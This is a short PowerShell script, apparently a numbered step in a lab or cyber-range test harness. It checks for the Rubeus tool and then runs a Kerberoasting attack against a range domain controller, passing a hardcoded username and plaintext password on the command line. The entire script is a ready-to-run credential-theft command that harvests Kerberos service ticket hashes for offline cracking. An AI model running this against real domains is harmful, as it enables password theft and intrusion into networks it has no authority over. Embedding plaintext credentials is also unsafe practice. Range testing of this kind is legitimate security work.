[CmdletBinding()]
param()
$ErrorActionPreference = "Continue"
$exe = "C:\Tools\cadre-attack\Rubeus.exe"
if (-not (Test-Path -LiteralPath $exe)) {
    Write-Output "T033_FAIL: Rubeus.exe missing"
    exit 1
}
& $exe kerberoast /domain:range.local /dc:dc03.range.local /creduser:cadre.local\chief_command /credpassword:C0mm@nd_Ch1ef! /creddomain:cadre.local /nowrap
